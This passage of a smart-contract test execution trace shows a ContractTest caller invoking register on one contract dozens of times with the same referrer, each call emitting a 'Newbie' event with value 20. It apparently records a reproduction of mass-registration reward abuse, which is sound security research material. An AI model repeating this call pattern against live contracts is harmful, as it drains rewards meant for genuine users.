    ├─ [4063] 0x4726010da871f4b57b5031E3EA48Bde961F122aA::register(0x14598f3a9f3042097486DC58C65780Daf3e3acFB)
    │   ├─ emit Newbie(param0: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], param1: 20)
    │   └─ ← [Stop] 
    ├─ [4063] 0x4726010da871f4b57b5031E3EA48Bde961F122aA::register(0x14598f3a9f3042097486DC58C65780Daf3e3acFB)
    │   ├─ emit Newbie(param0: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], param1: 20)
    │   └─ ← [Stop] 
    ├─ [4063] 0x4726010da871f4b57b5031E3EA48Bde961F122aA::register(0x14598f3a9f3042097486DC58C65780Daf3e3acFB)
    │   ├─ emit Newbie(param0: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], param1: 20)
    │   └─ ← [Stop] 
    ├─ [4063] 0x4726010da871f4b57b5031E3EA48Bde961F122aA::register(0x14598f3a9f3042097486DC58C65780Daf3e3acFB)
    │   ├─ emit Newbie(param0: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], param1: 20)
    │   └─ ← [Stop] 
    ├─ [4063] 0x4726010da871f4b57b5031E3EA48Bde961F122aA::register(0x14598f3a9f3042097486DC58C65780Daf3e3acFB)
    │   ├─ emit Newbie(param0: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], param1: 20)
    │   └─ ← [Stop] 
    ├─ [4063] 0x4726010da871f4b57b5031E3EA48Bde961F122aA::register(0x14598f3a9f3042097486DC58C65780Daf3e3acFB)
    │   ├─ emit Newbie(param0: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], param1: 20)
    │   └─ ← [Stop] 
    ├─ [4063] 0x4726010da871f4b57b5031E3EA48Bde961F122aA::register(0x14598f3a9f3042097486DC58C65780Daf3e3acFB)
    │   ├─ emit Newbie(param0: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], param1: 20)
    │   └─ ← [Stop] 
    ├─ [4063] 0x4726010da871f4b57b5031E3EA48Bde961F122aA::register(0x14598f3a9f3042097486DC58C65780Daf3e3acFB)
    │   ├─ emit Newbie(param0: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], param1: 20)
    │   └─ ← [Stop] 
    ├─ [4063] 0x4726010da871f4b57b5031E3EA48Bde961F122aA::register(0x14598f3a9f3042097486DC58C65780Daf3e3acFB)
    │   ├─ emit Newbie(param0: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], param1: 20)
    │   └─ ← [Stop] 
    ├─ [4063] 0x4726010da871f4b57b5031E3EA48Bde961F122aA::register(0x14598f3a9f3042097486DC58C65780Daf3e3acFB)
    │   ├─ emit Newbie(param0: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], param1: 20)
    │   └─ ← [Stop] 
    ├─ [4063] 0x4726010da871f4b57b5031E3EA48Bde961F122aA::register(0x14598f3a9f3042097486DC58C65780Daf3e3acFB)
    │   ├─ emit Newbie(param0: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], param1: 20)
    │   └─ ← [Stop] 
    ├─ [4063] 0x4726010da871f4b57b5031E3EA48Bde961F122aA::register(0x14598f3a9f3042097486DC58C65780Daf3e3acFB)
    │   ├─ emit Newbie(param0: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], param1: 20)
    │   └─ ← [Stop] 
    ├─ [4063] 0x4726010da871f4b57b5031E3EA48Bde961F122aA::register(0x14598f3a9f3042097486DC58C65780Daf3e3acFB)
    │   ├─ emit Newbie(param0: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], param1: 20)
    │   └─ ← [Stop] 
    ├─ [4063] 0x4726010da871f4b57b5031E3EA48Bde961F122aA::register(0x14598f3a9f3042097486DC58C65780Daf3e3acFB)
    │   ├─ emit Newbie(param0: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], param1: 20)
    │   └─ ← [Stop] 
    ├─ [4063] 0x4726010da871f4b57b5031E3EA48Bde961F122aA::register(0x14598f3a9f3042097486DC58C65780Daf3e3acFB)
    │   ├─ emit Newbie(param0: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], param1: 20)
    │   └─ ← [Stop] 
    ├─ [4063] 0x4726010da871f4b57b5031E3EA48Bde961F122aA::register(0x14598f3a9f3042097486DC58C65780Daf3e3acFB)
    │   ├─ emit Newbie(param0: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], param1: 20)
    │   └─ ← [Stop] 
    ├─ [4063] 0x4726010da871f4b57b5031E3EA48Bde961F122aA::register(0x14598f3a9f3042097486DC58C65780Daf3e3acFB)
    │   ├─ emit Newbie(param0: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], param1: 20)
    │   └─ ← [Stop] 
    ├─ [4063] 0x4726010da871f4b57b5031E3EA48Bde961F122aA::register(0x14598f3a9f3042097486DC58C65780Daf3e3acFB)
    │   ├─ emit Newbie(param0: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], param1: 20)
    │   └─ ← [Stop] 
    ├─ [4063] 0x4726010da871f4b57b5031E3EA48Bde961F122aA::register(0x14598f3a9f3042097486DC58C65780Daf3e3acFB)
    │   ├─ emit Newbie(param0: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], param1: 20)
    │   └─ ← [Stop] 
    ├─ [4063] 0x4726010da871f4b57b5031E3EA48Bde961F122aA::register(0x14598f3a9f3042097486DC58C65780Daf3e3acFB)
    │   ├─ emit Newbie(param0: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], param1: 20)
    │   └─ ← [Stop] 
    ├─ [4063] 0x4726010da871f4b57b5031E3EA48Bde961F122aA::register(0x14598f3a9f3042097486DC58C65780Daf3e3acFB)
    │   ├─ emit Newbie(param0: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], param1: 20)
    │   └─ ← [Stop] 
    ├─ [4063] 0x4726010da871f4b57b5031E3EA48Bde961F122aA::register(0x14598f3a9f3042097486DC58C65780Daf3e3acFB)
    │   ├─ emit Newbie(param0: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], param1: 20)
    │   └─ ← [Stop] 
    ├─ [4063] 0x4726010da871f4b57b5031E3EA48Bde961F122aA::register(0x14598f3a9f3042097486DC58C65780Daf3e3acFB)
    │   ├─ emit Newbie(param0: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], param1: 20)
    │   └─ ← [Stop] 
    ├─ [4063] 0x4726010da871f4b57b5031E3EA48Bde961F122aA::register(0x14598f3a9f3042097486DC58C65780Daf3e3acFB)
    │   ├─ emit Newbie(param0: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], param1: 20)
    │   └─ ← [Stop] 
    ├─ [4063] 0x4726010da871f4b57b5031E3EA48Bde961F122aA::register(0x14598f3a9f3042097486DC58C65780Daf3e3acFB)
    │   ├─ emit Newbie(param0: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], param1: 20)
    │   └─ ← [Stop] 
    ├─ [4063] 0x4726010da871f4b57b5031E3EA48Bde961F122aA::register(0x14598f3a9f3042097486DC58C65780Daf3e3acFB)
    │   ├─ emit Newbie(param0: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], param1: 20)
    │   └─ ← [Stop] 
    ├─ [4063] 0x4726010da871f4b57b5031E3EA48Bde961F122aA::register(0x14598f3a9f3042097486DC58C65780Daf3e3acFB)
    │   ├─ emit Newbie(param0: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], param1: 20)
    │   └─ ← [Stop] 
    ├─ [4063] 0x4726010da871f4b57b5031E3EA48Bde961F122aA::register(0x14598f3a9f3042097486DC58C65780Daf3e3acFB)
    │   ├─ emit Newbie(param0: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], param1: 20)
    │   └─ ← [Stop] 
    ├─ [4063] 0x4726010da871f4b57b5031E3EA48Bde961F122aA::register(0x14598f3a9f3042097486DC58C65780Daf3e3acFB)
    │   ├─ emit Newbie(param0: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], param1: 20)
    │   └─ ← [Stop] 
    ├─ [4063] 0x4726010da871f4b57b5031E3EA48Bde961F122aA::register(0x14598f3a9f3042097486DC58C65780Daf3e3acFB)
    │   ├─ emit Newbie(param0: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], param1: 20)
    │   └─ ← [Stop] 
    ├─ [4063] 0x4726010da871f4b57b5031E3EA48Bde961F122aA::register(0x14598f3a9f3042097486DC58C65780Daf3e3acFB)
    │   ├─ emit Newbie(param0: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], param1: 20)
    │   └─ ← [Stop] 
    ├─ [4063] 0x4726010da871f4b57b5031E3EA48Bde961F122aA::register(0x14598f3a9f3042097486DC58C65780Daf3e3acFB)
    │   ├─ emit Newbie(param0: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], param1: 20)
    │   └─ ← [Stop] 
    ├─ [4063] 0x4726010da871f4b57b5031E3EA48Bde961F122aA::register(0x14598f3a9f3042097486DC58C65780Daf3e3acFB)
    │   ├─ emit Newbie(param0: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], param1: 20)
    │   └─ ← [Stop] 
    ├─ [4063] 0x4726010da871f4b57b5031E3EA48Bde961F122aA::register(0x14598f3a9f3042097486DC58C65780Daf3e3acFB)
    │   ├─ emit Newbie(param0: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], param1: 20)
    │   └─ ← [Stop] 
    ├─ [4063] 0x4726010da871f4b57b5031E3EA48Bde961F122aA::register(0x14598f3a9f3042097486DC58C65780Daf3e3acFB)
    │   ├─ emit Newbie(param0: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], param1: 20)
    │   └─ ← [Stop] 
    ├─ [4063] 0x4726010da871f4b57b5031E3EA48Bde961F122aA::register(0x14598f3a9f3042097486DC58C65780Daf3e3acFB)
    │   ├─ emit Newbie(param0: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], param1: 20)
    │   └─ ← [Stop] 
    ├─ [4063] 0x4726010da871f4b57b5031E3EA48Bde961F122aA::register(0x14598f3a9f3042097486DC58C65780Daf3e3acFB)
    │   ├─ emit Newbie(param0: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], param1: 20)
    │   └─ ← [Stop] 
    ├─ [4063] 0x4726010da871f4b57b5031E3EA48Bde961F122aA::register(0x14598f3a9f3042097486DC58C65780Daf3e3acFB)
    │   ├─ emit Newbie(param0: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], param1: 20)
    │   └─ ← [Stop] 
    ├─ [4063] 0x4726010da871f4b57b5031E3EA48Bde961F122aA::register(0x14598f3a9f3042097486DC58C65780Daf3e3acFB)
    │   ├─ emit Newbie(param0: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], param1: 20)
    │   └─ ← [Stop] 
    ├─ [4063] 0x4726010da871f4b57b5031E3EA48Bde961F122aA::register(0x14598f3a9f3042097486DC58C65780Daf3e3acFB)
    │   ├─ emit Newbie(param0: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], param1: 20)
    │   └─ ← [Stop] 
    ├─ [4063] 0x4726010da871f4b57b5031E3EA48Bde961F122aA::register(0x14598f3a9f3042097486DC58C65780Daf3e3acFB)
    │   ├─ emit Newbie(param0: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], param1: 20)
    │   └─ ← [Stop] 
    ├─ [4063] 0x4726010da871f4b57b5031E3EA48Bde961F122aA::register(0x14598f3a9f3042097486DC58C65780Daf3e3acFB)
    │   ├─ emit Newbie(param0: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], param1: 20)
    │   └─ ← [Stop] 
    ├─ [4063] 0x4726010da871f4b57b5031E3EA48Bde961F122aA::register(0x14598f3a9f3042097486DC58C65780Daf3e3acFB)
    │   ├─ emit Newbie(param0: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], param1: 20)
    │   └─ ← [Stop] 
    ├─ [4063] 0x4726010da871f4b57b5031E3EA48Bde961F122aA::register(0x14598f3a9f3042097486DC58C65780Daf3e3acFB)
    │   ├─ emit Newbie(param0: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], param1: 20)
    │   └─ ← [Stop] 
    ├─ [4063] 0x4726010da871f4b57b5031E3EA48Bde961F122aA::register(0x14598f3a9f3042097486DC58C65780Daf3e3acFB)
    │   ├─ emit Newbie(param0: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], param1: 20)
    │   └─ ← [Stop] 
    ├─ [4063] 0x4726010da871f4b57b5031E3EA48Bde961F122aA::register(0x14598f3a9f3042097486DC58C65780Daf3e3acFB)
    │   ├─ emit Newbie(param0: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], param1: 20)
    │   └─ ← [Stop] 
    ├─ [4063] 0x4726010da871f4b57b5031E3EA48Bde961F122aA::register(0x14598f3a9f3042097486DC58C65780Daf3e3acFB)
    │   ├─ emit Newbie(param0: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], param1: 20)
    │   └─ ← [Stop] 
    ├─ [4063] 0x4726010da871f4b57b5031E3EA48Bde961F122aA::register(0x14598f3a9f3042097486DC58C65780Daf3e3acFB)
    │   ├─ emit Newbie(param0: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], param1: 20)
    │   └─ ← [Stop] 
    ├─ [4063] 0x4726010da871f4b57b5031E3EA48Bde961F122aA::register(0x14598f3a9f3042097486DC58C65780Daf3e3acFB)
    │   ├─ emit Newbie(param0: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], param1: 20)
    │   └─ ← [Stop] 
    ├─ [4063] 0x4726010da871f4b57b5031E3EA48Bde961F122aA::register(0x14598f3a9f3042097486DC58C65780Daf3e3acFB)
    │   ├─ emit Newbie(param0: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], param1: 20)
    │   └─ ← [Stop] 
    ├─ [4063] 0x4726010da871f4b57b5031E3EA48Bde961F122aA::register(0x14598f3a9f3042097486DC58C65780Daf3e3acFB)
    │   ├─ emit Newbie(param0: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], param1: 20)
    │   └─ ← [Stop] 
    ├─ [4063] 0x4726010da871f4b57b5031E3EA48Bde961F122aA::register(0x14598f3a9f3042097486DC58C65780Daf3e3acFB)
    │   ├─ emit Newbie(param0: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], param1: 20)
    │   └─ ← [Stop] 
    ├─ [4063] 0x4726010da871f4b57b5031E3EA48Bde961F122aA::register(0x14598f3a9f3042097486DC58C65780Daf3e3acFB)
    │   ├─ emit Newbie(param0: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], param1: 20)
    │   └─ ← [Stop] 
    ├─ [4063] 0x4726010da871f4b57b5031E3EA48Bde961F122aA::register(0x14598f3a9f3042097486DC58C65780Daf3e3acFB)
    │   ├─ emit Newbie(param0: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], param1: 20)
    │   └─ ← [Stop] 
    ├─ [4063] 0x4726010da871f4b57b5031E3EA48Bde961F122aA::register(0x14598f3a9f3042097486DC58C65780Daf3e3acFB)
    │   ├─ emit Newbie(param0: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], param1: 20)
    │   └─ ← [Stop] 
    ├─ [4063] 0x4726010da871f4b57b5031E3EA48Bde961F122aA::register(0x14598f3a9f3042097486DC58C65780Daf3e3acFB)
    │   ├─ emit Newbie(param0: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], param1: 20)
    │   └─ ← [Stop] 
    ├─ [4063] 0x4726010da871f4b57b5031E3EA48Bde961F122aA::register(0x14598f3a9f3042097486DC58C65780Daf3e3acFB)
    │   ├─ emit Newbie(param0: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], param1: 20)
    │   └─ ← [Stop] 
    ├─ [4063] 0x4726010da871f4b57b5031E3EA48Bde961F122aA::register(0x14598f3a9f3042097486DC58C65780Daf3e3acFB)
    │   ├─ emit Newbie(param0: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], param1: 20)
    │   └─ ← [Stop] 
    ├─ [4063] 0x4726010da871f4b57b5031E3EA48Bde961F122aA::register(0x14598f3a9f3042097486DC58C65780Daf3e3acFB)
    │   ├─ emit Newbie(param0: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], param1: 20)
    │   └─ ← [Stop] 
    ├─ [4063] 0x4726010da871f4b57b5031E3EA48Bde961F122aA::register(0x14598f3a9f3042097486DC58C65780Daf3e3acFB)
    │   ├─ emit Newbie(param0: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], param1: 20)
    │   └─ ← [Stop] 
    ├─ [4063] 0x4726010da871f4b57b5031E3EA48Bde961F122aA::register(0x14598f3a9f3042097486DC58C65780Daf3e3acFB)
    │   ├─ emit Newbie(param0: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], param1: 20)
    │   └─ ← [Stop] 
    ├─ [4063] 0x4726010da871f4b57b5031E3EA48Bde961F122aA::register(0x14598f3a9f3042097486DC58C65780Daf3e3acFB)
    │   ├─ emit Newbie(param0: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], param1: 20)
    │   └─ ← [Stop] 
    ├─ [4063] 0x4726010da871f4b57b5031E3EA48Bde961F122aA::register(0x14598f3a9f3042097486DC58C65780Daf3e3acFB)
    │   ├─ emit Newbie(param0: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], param1: 20)
    │   └─ ← [Stop] 
    ├─ [4063] 0x4726010da871f4b57b5031E3EA48Bde961F122aA::register(0x14598f3a9f3042097486DC58C65780Daf3e3acFB)
    │   ├─ emit Newbie(param0: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], param1: 20)
    │   └─ ← [Stop] 
    ├─ [4063] 0x4726010da871f4b57b5031E3EA48Bde961F122aA::register(0x14598f3a9f3042097486DC58C65780Daf3e3acFB)
    │   ├─ emit Newbie(param0: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], param1: 20)
    │   └─ ← [Stop] 
    ├─ [4063] 0x4726010da871f4b57b5031E3EA48Bde961F122aA::register(0x14598f3a9f3042097486DC58C65780Daf3e3acFB)
    │   ├─ emit Newbie(param0: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], param1: 20)
    │   └─ ← [Stop] 
    ├─ [4063] 0x4726010da871f4b57b5031E3EA48Bde961F122aA::register(0x14598f3a9f3042097486DC58C65780Daf3e3acFB)
    │   ├─ emit Newbie(param0: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], param1: 20)
    │   └─ ← [Stop] 
    ├─ [4063] 0x4726010da871f4b57b5031E3EA48Bde961F122aA::register(0x14598f3a9f3042097486DC58C65780Daf3e3acFB)
    │   ├─ emit Newbie(param0: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], param1: 20)
    │   └─ ← [Stop] 
    ├─ [4063] 0x4726010da871f4b57b5031E3EA48Bde961F122aA::register(0x14598f3a9f3042097486DC58C65780Daf3e3acFB)
    │   ├─ emit Newbie(param0: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], param1: 20)
    │   └─ ← [Stop] 
    ├─ [4063] 0x4726010da871f4b57b5031E3EA48Bde961F122aA::register(0x14598f3a9f3042097486DC58C65780Daf3e3acFB)
    │   ├─ emit Newbie(param0: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], param1: 20)
    │   └─ ← [Stop] 
    ├─ [4063] 0x4726010da871f4b57b5031E3EA48Bde961F122aA::register(0x14598f3a9f3042097486DC58C65780Daf3e3acFB)
    │   ├─ emit Newbie(param0: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], param1: 20)
    │   └─ ← [Stop] 
    ├─ [4063] 0x4726010da871f4b57b5031E3EA48Bde961F122aA::register(0x14598f3a9f3042097486DC58C65780Daf3e3acFB)
    │   ├─ emit Newbie(param0: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], param1: 20)
    │   └─ ← [Stop] 
    ├─ [4063] 0x4726010da871f4b57b5031E3EA48Bde961F122aA::register(0x14598f3a9f3042097486DC58C65780Daf3e3acFB)
    │   ├─ emit Newbie(param0: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], param1: 20)
    │   └─ ← [Stop] 
    ├─ [4063] 0x4726010da871f4b57b5031E3EA48Bde961F122aA::register(0x14598f3a9f3042097486DC58C65780Daf3e3acFB)
    │   ├─ emit Newbie(param0: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], param1: 20)
    │   └─ ← [Stop] 
    ├─ [4063] 0x4726010da871f4b57b5031E3EA48Bde961F122aA::register(0x14598f3a9f3042097486DC58C65780Daf3e3acFB)
    │   ├─ emit Newbie(param0: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], param1: 20)
    │   └─ ← [Stop] 
    ├─ [4063] 0x4726010da871f4b57b5031E3EA48Bde961F122aA::register(0x14598f3a9f3042097486DC58C65780Daf3e3acFB)
    │   ├─ emit Newbie(param0: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], param1: 20)
    │   └─ ← [Stop] 
    ├─ [4063] 0x4726010da871f4b57b5031E3EA48Bde961F122aA::register(0x14598f3a9f3042097486DC58C65780Daf3e3acFB)
    │   ├─ emit Newbie(param0: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], param1: 20)
    │   └─ ← [Stop] 
    ├─ [4063] 0x4726010da871f4b57b5031E3EA48Bde961F122aA::register(0x14598f3a9f3042097486DC58C65780Daf3e3acFB)
    │   ├─ emit Newbie(param0: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], param1: 20)
    │   └─ ← [Stop] 
    ├─ [4063] 0x4726010da871f4b57b5031E3EA48Bde961F122aA::register(0x14598f3a9f3042097486DC58C65780Daf3e3acFB)
    │   ├─ emit Newbie(param0: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], param1: 20)
    │   └─ ← [Stop] 
    ├─ [4063] 0x4726010da871f4b57b5031E3EA48Bde961F122aA::register(0x14598f3a9f3042097486DC58C65780Daf3e3acFB)
    │   ├─ emit Newbie(param0: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], param1: 20)
    │   └─ ← [Stop] 
    ├─ [4063] 0x4726010da871f4b57b5031E3EA48Bde961F122aA::register(0x14598f3a9f3042097486DC58C65780Daf3e3acFB)
    │   ├─ emit Newbie(param0: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], param1: 20)
    │   └─ ← [Stop] 
    ├─ [4063] 0x4726010da871f4b57b5031E3EA48Bde961F122aA::register(0x14598f3a9f3042097486DC58C65780Daf3e3acFB)
    │   ├─ emit Newbie(param0: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], param1: 20)
    │   └─ ← [Stop] 
    ├─ [4063] 0x4726010da871f4b57b5031E3EA48Bde961F122aA::register(0x14598f3a9f3042097486DC58C65780Daf3e3acFB)
    │   ├─ emit Newbie(param0: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], param1: 20)
    │   └─ ← [Stop] 
    ├─ [4063] 0x4726010da871f4b57b5031E3EA48Bde961F122aA::register(0x14598f3a9f3042097486DC58C65780Daf3e3acFB)
    │   ├─ emit Newbie(param0: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], param1: 20)
    │   └─ ← [Stop] 
    ├─ [4063] 0x4726010da871f4b57b5031E3EA48Bde961F122aA::register(0x14598f3a9f3042097486DC58C65780Daf3e3acFB)
    │   ├─ emit Newbie(param0: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], param1: 20)
    │   └─ ← [Stop] 
    ├─ [4063] 0x4726010da871f4b57b5031E3EA48Bde961F122aA::register(0x14598f3a9f3042097486DC58C65780Daf3e3acFB)
    │   ├─ emit Newbie(param0: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], param1: 20)
    │   └─ ← [Stop] 
    ├─ [4063] 0x4726010da871f4b57b5031E3EA48Bde961F122aA::register(0x14598f3a9f3042097486DC58C65780Daf3e3acFB)
    │   ├─ emit Newbie(param0: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], param1: 20)
    │   └─ ← [Stop] 
    ├─ [4063] 0x4726010da871f4b57b5031E3EA48Bde961F122aA::register(0x14598f3a9f3042097486DC58C65780Daf3e3acFB)
    │   ├─ emit Newbie(param0: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], param1: 20)
    │   └─ ← [Stop] 
    ├─ [4063] 0x4726010da871f4b57b5031E3EA48Bde961F122aA::register(0x14598f3a9f3042097486DC58C65780Daf3e3acFB)
    │   ├─ emit Newbie(param0: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], param1: 20)
    │   └─ ← [Stop] 
    ├─ [4063] 0x4726010da871f4b57b5031E3EA48Bde961F122aA::register(0x14598f3a9f3042097486DC58C65780Daf3e3acFB)
    │   ├─ emit Newbie(param0: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], param1: 20)
    │   └─ ← [Stop] 
    ├─ [4063] 0x4726010da871f4b57b5031E3EA48Bde961F122aA::register(0x14598f3a9f3042097486DC58C65780Daf3e3acFB)
    │   ├─ emit Newbie(param0: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], param1: 20)
    │   └─ ← [Stop] 
    ├─ [4063] 0x4726010da871f4b57b5031E3EA48Bde961F122aA::register(0x14598f3a9f3042097486DC58C65780Daf3e3acFB)
    │   ├─ emit Newbie(param0: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], param1: 20)
    │   └─ ← [Stop] 
    ├─ [4063] 0x4726010da871f4b57b5031E3EA48Bde961F122aA::register(0x14598f3a9f3042097486DC58C65780Daf3e3acFB)
    │   ├─ emit Newbie(param0: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], param1: 20)
    │   └─ ← [Stop] 
    ├─ [4063] 0x4726010da871f4b57b5031E3EA48Bde961F122aA::register(0x14598f3a9f3042097486DC58C65780Daf3e3acFB)
    │   ├─ emit Newbie(param0: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], param1: 20)
    │   └─ ← [Stop] 
    ├─ [4063] 0x4726010da871f4b57b5031E3EA48Bde961F122aA::register(0x14598f3a9f3042097486DC58C65780Daf3e3acFB)
    │   ├─ emit Newbie(param0: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], param1: 20)
    │   └─ ← [Stop] 
    ├─ [4063] 0x4726010da871f4b57b5031E3EA48Bde961F122aA::register(0x14598f3a9f3042097486DC58C65780Daf3e3acFB)
    │   ├─ emit Newbie(param0: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], param1: 20)
    │   └─ ← [Stop] 
    ├─ [4063] 0x4726010da871f4b57b5031E3EA48Bde961F122aA::register(0x14598f3a9f3042097486DC58C65780Daf3e3acFB)
    │   ├─ emit Newbie(param0: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], param1: 20)
    │   └─ ← [Stop] 
    ├─ [4063] 0x4726010da871f4b57b5031E3EA48Bde961F122aA::register(0x14598f3a9f3042097486DC58C65780Daf3e3acFB)
    │   ├─ emit Newbie(param0: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], param1: 20)
    │   └─ ← [Stop] 
    ├─ [4063] 0x4726010da871f4b57b5031E3EA48Bde961F122aA::register(0x14598f3a9f3042097486DC58C65780Daf3e3acFB)
    │   ├─ emit Newbie(param0: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], param1: 20)
    │   └─ ← [Stop] 
    ├─ [4063] 0x4726010da871f4b57b5031E3EA48Bde961F122aA::register(0x14598f3a9f3042097486DC58C65780Daf3e3acFB)
    │   ├─ emit Newbie(param0: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], param1: 20)
    │   └─ ← [Stop] 
    ├─ [4063] 0x4726010da871f4b57b5031E3EA48Bde961F122aA::register(0x14598f3a9f3042097486DC58C65780Daf3e3acFB)
    │   ├─ emit Newbie(param0: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], param1: 20)
    │   └─ ← [Stop] 
    ├─ [4063] 0x4726010da871f4b57b5031E3EA48Bde961F122aA::register(0x14598f3a9f3042097486DC58C65780Daf3e3acFB)
    │   ├─ emit Newbie(param0: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], param1: 20)
    │   └─ ← [Stop] 
